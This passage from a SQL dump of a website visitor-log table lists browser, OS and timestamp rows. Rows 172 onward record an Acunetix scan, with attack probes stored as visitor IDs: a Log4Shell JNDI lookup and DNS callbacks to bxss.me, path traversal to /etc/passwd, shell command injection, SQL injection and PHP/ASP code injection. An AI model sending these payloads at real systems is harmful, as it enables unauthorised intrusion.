Safari/537.36','Linux','x86_64','2021-11-25 05:15:20','2021-11-25 10:07:27'),(104,'840353776','Mobile Safari','13.0.3','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','iOS','13.2.3','2021-11-25 08:06:02','2021-11-25 08:06:02'),(105,'2035746371','Chrome','96.0.4664.45','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36','Linux','x86_64','2021-12-20 05:31:19','2021-12-20 06:00:10'),(106,'3481189777','Chrome','96.0.4664.45','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36','Linux','x86_64','2021-12-20 08:30:34','2021-12-20 08:41:33'),(107,'30765005','Chrome','96.0.4664.110','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36','Linux','x86_64','2022-01-02 10:39:02','2022-01-02 12:19:03'),(108,'30765005','Chrome','96.0.4664.110','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36','Linux','x86_64','2022-01-09 08:25:16','2022-01-09 17:59:40'),(109,'3320614821','Chrome','96.0.4664.110','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Android','6.0','2022-01-09 10:01:41','2022-01-09 10:01:41'),(110,'1193130634','Chrome','96.0.4664.110','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Android','6.0','2022-01-09 15:10:59','2022-01-09 15:10:59'),(111,'1613282533','Chrome','96.0.4664.110','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Android','6.0','2022-01-09 15:11:37','2022-01-09 15:11:37'),(112,'30765005','Chrome','96.0.4664.110','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36','Linux','x86_64','2022-01-10 01:37:30','2022-01-10 04:15:21'),(113,'1444327705','Chrome','97.0.4692.71','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36','Linux','x86_64','2022-01-14 14:19:17','2022-01-14 14:50:11'),(114,'1073366217','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-07 06:34:31','2022-02-07 13:27:33'),(115,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-09 09:42:39','2022-02-09 09:42:41'),(116,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-10 13:41:26','2022-02-10 14:21:31'),(117,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-14 12:38:26','2022-02-14 12:41:05'),(118,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-15 15:14:46','2022-02-15 19:59:07'),(119,'3825328445','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-15 15:28:07','2022-02-15 15:28:09'),(120,'3110695857','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-15 15:30:48','2022-02-15 15:30:48'),(121,'1265727730','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-15 15:33:16','2022-02-15 15:33:16'),(122,'3079998283','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-15 15:33:38','2022-02-15 15:33:38'),(123,'4178766005','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-15 18:02:26','2022-02-15 18:02:26'),(124,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-16 06:33:52','2022-02-16 19:33:06'),(125,'3771307716','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-16 16:02:53','2022-02-16 16:07:42'),(126,'2065970009','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-02-16 16:11:44','2022-02-16 16:11:51'),(127,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-22 12:15:06','2022-02-22 18:38:26'),(128,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-23 09:33:32','2022-02-23 11:55:18'),(129,'1406250003','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-02-24 07:45:10','2022-02-24 11:24:22'),(130,'4047576032','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-03-07 06:29:20','2022-03-07 08:50:51'),(131,'2000999550','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-03-07 11:37:22','2022-03-07 15:17:48'),(132,'2109796563','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-03-07 13:20:50','2022-03-07 13:20:50'),(133,'2275790834','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-03-07 13:43:02','2022-03-07 13:43:02'),(134,'2916646642','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-03-07 14:04:19','2022-03-07 14:04:23'),(135,'2000999550','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-03-09 07:37:26','2022-03-09 16:43:16'),(136,'2000999550','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-03-10 06:54:45','2022-03-10 16:27:51'),(137,'2096188923','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-03-10 13:32:40','2022-03-10 13:32:40'),(138,'1779595648','Chrome','97.0.4692.99','Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36','Android','6.0','2022-03-10 13:33:05','2022-03-10 13:33:40'),(139,'2000999550','Chrome','97.0.4692.99','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36','Linux','x86_64','2022-03-11 05:13:22','2022-03-11 07:02:33'),(140,'1208361531','Chrome','102.0.5005.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','Windows','NT 10.0','2022-06-13 16:45:58','2022-06-13 17:13:06'),(141,'1208361531','Chrome','102.0.5005.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','Windows','NT 10.0','2022-06-14 06:00:43','2022-06-14 20:47:42'),(142,'1208361531','Chrome','102.0.5005.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36','Windows','NT 10.0','2022-06-15 06:32:03','2022-06-15 09:51:31'),(143,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-15 15:32:53','2022-06-15 20:27:00'),(144,'1466015724','Firefox','101.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0','Windows','NT 10.0','2022-06-15 16:20:20','2022-06-15 16:20:20'),(145,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-20 07:03:27','2022-06-20 19:59:13'),(146,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-21 04:57:36','2022-06-21 19:45:13'),(147,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-22 06:38:39','2022-06-22 20:22:45'),(148,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-23 06:27:59','2022-06-23 20:59:34'),(149,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-23 21:01:15','2022-06-24 20:40:37'),(150,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-24 21:07:48','2022-06-25 13:48:28'),(151,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-26 17:01:02','2022-06-26 20:44:08'),(152,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-27 06:02:43','2022-06-27 07:22:45'),(153,'1837740671','Chrome','102.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-30 03:27:09','2022-06-30 03:44:26'),(154,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-30 14:32:42','2022-06-30 19:10:43'),(155,'4185662114','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-30 19:14:34','2022-06-30 20:59:24'),(156,'4185662114','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-06-30 21:00:23','2022-07-01 01:00:01'),(157,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-07-17 06:52:59','2022-07-17 20:08:43'),(158,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-07-17 21:14:00','2022-07-18 07:15:09'),(159,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-06 14:25:53','2022-08-06 20:59:57'),(160,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-06 21:00:27','2022-08-07 20:13:14'),(161,'3249948015','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-07 19:20:58','2022-08-07 19:20:58'),(162,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-08 19:18:48','2022-08-08 20:53:34'),(163,'943984231','Chrome','104.0.5112.81','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47','Windows','NT 10.0','2022-08-08 20:31:29','2022-08-08 20:31:29'),(164,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-09 06:03:11','2022-08-09 20:52:43'),(165,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-10 04:43:40','2022-08-10 19:59:14'),(166,'2345825735','Chrome','103.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-10 21:09:48','2022-08-11 09:34:41'),(167,'925328670','Chrome','103.0.0.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36','Linux','x86_64','2022-08-11 03:27:56','2022-08-11 03:44:35'),(168,'322160536','Chrome','103.0.0.0','Mozilla/5.0 (Linux; Android 10; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Android','10','2022-08-11 03:29:14','2022-08-11 03:29:14'),(169,'1496952862','Chrome','104.0.0.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Windows','NT 10.0','2022-08-11 03:37:01','2022-08-11 14:16:02'),(170,'648137169','Chrome','103.0.0.0','Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Android','11','2022-08-11 03:47:23','2022-08-11 15:20:59'),(171,'3181461139','Chrome','103.0.0.0','Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Android','11','2022-08-11 03:49:17','2022-08-11 14:50:10'),(172,'1013732283','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/3','Windows','NT 10.0','2022-08-11 10:34:48','2022-08-11 10:37:31'),(173,'3887475426','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/4','Windows','NT 10.0','2022-08-11 10:35:12','2022-08-11 10:39:15'),(174,'496030994','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:35:17','2022-08-11 11:51:32'),(175,'3383152575','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/7','Windows','NT 10.0','2022-08-11 10:36:13','2022-08-11 11:51:32'),(176,'659996680','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/8','Windows','NT 10.0','2022-08-11 10:36:17','2022-08-11 11:51:32'),(177,'496030994<esi:include src=\"http://bxss.me/rpb.png\"/>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(178,'${j${::-n}di:dns${::-:}//hitttcrpdoxge6f50c${::-.}bxss.me}zzzz','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(179,'../../../../../../../../../../../../../../etc/passwd','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:37'),(180,NULL,'Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 12:16:02'),(181,'${9999013+9999322}','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(182,'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:40'),(183,'response.write(9147822*9192798)','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(184,'\'.gethostbyname(lc(\'hitdz\'.\'jcruovhaab40b.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(111).chr(69).chr(106).chr(73).\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(185,'echo ghxopf$()\\ zujoan\\nz^xyu||a #\' &echo ghxopf$()\\ zujoan\\nz^xyu||a #|\" &echo ghxopf$()\\ zujoan\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(186,'sAFDGR3s','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(187,')','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:40'),(188,'496030994&n928187=v939136','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(189,';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:41'),(190,'-1 OR 2+713-713-1=0+0+0+1 --','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(191,'../../../../../../../../../../../../../../windows/win.ini','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:38'),(192,'12345\'\"\\\'\\\");|]*\0{\r\n<\0>','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(193,'visitorsLog','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:41'),(194,')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:41'),(195,'1some_inexistent_file_with_long_name\0.jpg','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:40'),(196,'\'+response.write(9147822*9192798)+\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(197,'&echo sruibz$()\\ bfvdmw\\nz^xyu||a #\' &echo sruibz$()\\ bfvdmw\\nz^xyu||a #|\" &echo sruibz$()\\ bfvdmw\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(198,'!(()&&!|*|*|','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:40'),(199,'\".gethostbyname(lc(\"hitpz\".\"ykjdakpid4426.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(111).chr(79).chr(99).chr(68).\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:03','2022-08-11 10:37:03'),(200,'\';print(md5(31337));$a=\'','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:41'),(201,'-1 OR 2+540-540-1=0+0+0+1','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(202,'Http://bxss.me/t/fit.txt','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:40'),(203,'\"+response.write(9147822*9192798)+\"','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(204,'|echo fxgwny$()\\ vagvox\\nz^xyu||a #\' |echo fxgwny$()\\ vagvox\\nz^xyu||a #|\" |echo fxgwny$()\\ vagvox\\nz^xyu||a #','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 10:37:04'),(205,'\'\"()','Chrome','92.0.4512.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Acunetix-Deepscan/6','Windows','NT 10.0','2022-08-11 10:37:04','2022-08-11 